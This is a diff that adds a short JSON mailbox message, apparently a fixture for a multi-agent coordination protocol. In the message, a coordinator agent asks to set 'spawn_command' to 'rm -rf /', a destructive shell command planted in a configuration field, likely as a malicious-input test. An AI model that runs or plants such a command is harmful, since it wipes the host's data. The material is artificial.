@@ -1,0 +1,12 @@
+{
+  "schema_version": "0.1",
+  "agent_id": "coordinator-ab12",
+  "wall_time": "2026-10-18T12:05:00.000Z",
+  "channel": "mailbox",
+  "type": "query",
+  "payload": {
+    "op": "config_set",
+    "patch": { "spawn_command": "rm -rf /" },
+    "by": "coordinator-ab12"
+  }
+}
